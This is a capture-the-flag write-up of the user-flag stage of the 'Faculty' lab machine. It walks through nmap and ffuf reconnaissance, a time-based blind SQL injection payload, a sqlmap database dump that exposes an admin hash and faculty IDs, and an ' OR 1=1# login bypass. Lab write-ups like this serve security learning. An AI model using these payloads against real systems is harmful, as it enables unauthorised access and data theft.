# Faculty

## User Flag

Immediately after adding faculty.htb to my notes, I immediatly tried accessing a webpage and was greeted with a login page right away.

After performing a quick nmap scan, I found that it has an open port on 22 and 80.

The /login.php page presents us with an option to input a faculty id number. When inputing a number it simply sends a POST request in the form of form data.

Next I'm going to open the request in Burp Suite and work from there.

But before I do that, I should get a good understanding of the systems I'm breaking into.

### Fuzzing Directories

Next, I fuzzed the web directories to see what I could make out of them.

```
ffuf -u http://faculty.htb/FUZZ -w directory-list-1.0.txt
```

The directory I pulled back was: /admin/

Accessing http://faculty.htb/admin/ presented me with a dashboard for a college. I was currently logged in as user 27, which I'm not quite sure why.

Poking around, there is potential for LFI as well as a logout box which will allow you to login as other users.

### SQL Injections

Looks like it responded to a basic ' SQLi payload. So I'm going to manually try with some other payloads until I get a hit.

Eventually I got one, I know it succeeded because it ran SLEEP(5) and caused the server to delay for 5 seconds.

```
id_no=2100935'+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)+AND+'1'='1
```

Afterward, I saved my successful request and shoved it into sqlmap. Which I am hoping will give me a table dump.

```
sqlmap -r request.req
```

Notably I retrieved a database called scheduling_db.

It contains 6 tables inside.

* scheduling_db
	* class_schedule_info
	* courses
	* faculty
	* schedules
	* subjects
		* id
		* subject
		* description
	* users

We were also able to gain an admin password hash as well as some ids.
```
admin:1fecbe762af147c1176a0fc2c722a345

id | id_no
1	63033226
2	85662050
3	30903070
```

Turns out we can use these id numbers to log into the system without any other need for credentials!

It should also be noted that the admin login page on /admin/ can be bypassed with a simple SQL injection.

```
' OR 1=1#
poop
```


